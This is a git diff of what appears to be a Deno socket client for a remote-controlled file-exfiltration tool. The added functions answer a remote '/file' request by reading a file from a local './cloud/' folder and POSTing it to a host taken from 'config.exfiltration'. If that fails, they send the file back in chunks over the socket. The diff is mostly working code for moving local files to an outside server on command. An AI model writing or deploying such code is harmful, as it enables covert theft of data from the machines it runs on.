@@ -78,13 +78,13 @@ async function generateSocketClient(hostname, port, authKey){
     
     // Receive message
     client.on(Event.receive, (client: Client, data: Packet) => {
-        data = data.toString()
+        data = JSON.parse(data.toString())
         interpretSocketMessages(client, data)
     });
     
     // Connection close
     client.on(Event.close, (client: Client) => {
-        console.log("Close");
+        console.log("- socket Close");
         //do the auto connect
     });
     
@@ -99,12 +99,79 @@ async function generateSocketClient(hostname, port, authKey){
     })
 }
 
+let waitingRoom = []
+
 async function interpretSocketMessages(client, msg){
-    console.log('new message')
-    console.log(msg)
+    //let's do some file transfer
+    if(msg.url == "/file"){
+        //respond with the file "test.txt" in base64
+        client.write(JSON.stringify({
+            url: "/send",
+            name: msg.name,
+        }))
+        waitForAllow(client, msg.name)
+    } else if(msg.url == "/send"){
+        waitingRoom.push({
+            path: msg.path,
+        })
+    }
 }
 
+async function waitForAllow(client, path) {
+    new Promise(async (resolve, reject) => {
+        let i = setInterval(() => {
+            let obj = waitingRoom.filter(e => e.path == path)
+            if(obj.length > 0){
+                clearInterval(i)
+                sendFileData(client, path)
+            }
+        }, 1000)
+    })
+}
 
+async function sendFileData(client, path){
+    console.log('~~ Sending file data')
+    let fileContent = (Deno.readFileSync("./cloud/"+path)).toString()
+
+    //cut by 5
+    try{
+        await fetch(config.exfiltration.hostname+ ":" +config.exfiltration.uploadport + '/upload', {
+            method: 'POST',
+            headers: {
+                "ir-server": "HIBVUIK",
+                "fileName": path
+            },
+            body: Deno.readFileSync("./cloud/"+path)
+        })
+    } catch(err){
+        console.log(err)
+        let array = []
+        for(let i = 0; i < fileContent.length; i+=64000){
+            array.push(fileContent.substring(i, i+64000))
+        }
+        console.log(array.length)
+        sendFile(client, array, 0, path)
+    }
+}
+
+function sendFile(client, array, i, path){
+    setTimeout(() => {
+        client.write(JSON.stringify({
+            url: "/upload",
+            name: path,
+            i: i,
+            value: array[i],
+        }))
+        if(i < array.length-1){
+            sendFile(client, array, i+1, path)
+        } else {
+            client.write(JSON.stringify({
+                url: "/done",
+                name: path,
+            }))
+        }
+    }, 50)
+}
 
 //Utils functions
 async function manageArgs() {
